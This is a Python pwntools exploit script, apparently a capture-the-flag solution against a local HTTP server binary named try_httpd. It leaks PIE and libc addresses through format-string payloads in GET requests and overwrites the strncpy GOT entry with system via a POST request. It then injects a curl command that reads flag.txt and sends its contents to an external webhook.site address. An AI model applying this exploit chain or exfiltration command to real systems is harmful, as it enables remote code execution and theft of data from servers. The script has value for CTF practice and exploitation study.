from pwn import *
import requests as rq
import base64
context(os='linux', log_level='debug', arch='amd64')
elf = ELF("dist/try_httpd")
libc = ELF("writeup/2.31-0ubuntu9.7_amd64/libc-2.31.so")

addr="127.0.0.1"
port=59012

r = remote(addr, port)
pay = base64.b64encode(b'%%%d$p' % (0x9+0x5))
r.send(b'GET /get.cgi?'+pay+b'\r\n')

pie = int(r.recv()[-16:], 16)-0xad3-0x1d34
log.success("pie->"+hex(pie))
strncpy = pie+elf.got['strncpy']
log.success("strncpy->"+hex(strncpy))
r.close()


pay = base64.b64encode(b'%%%d$p' % (0xdf-0x1+0x6))
r = remote(addr, port)
r.send(b'GET /get.cgi?'+pay+b'\r\n')
libc_base = int(r.recv()[-16:], 16)-243-libc.sym['__libc_start_main']
log.success("libc_base->"+hex(libc_base))
log.success("system->"+hex(libc_base+libc.sym['system']))
system = libc_base+libc.sym['system']
r.close()

pay = base64.b64encode(b'\x24'+p64(strncpy)+p64(system))
r = remote(addr, 59012)
r.send(b'POST /post.cgi \r\nContent-Length: %d \r\n\r\n%s' %
       (len(pay), pay)+b'\r\n')
print(r.recv())
r.close()


pay = base64.b64encode(b"curl -H flag:$(cat flag.txt) https://webhook.site/4e408884-7702-4794-9f35-9ace8b274d1f")
r = remote(addr, port)
r.send(b'GET /longlongname.cgi?'+pay+b'\r\n')
r.close()


r.interactive()
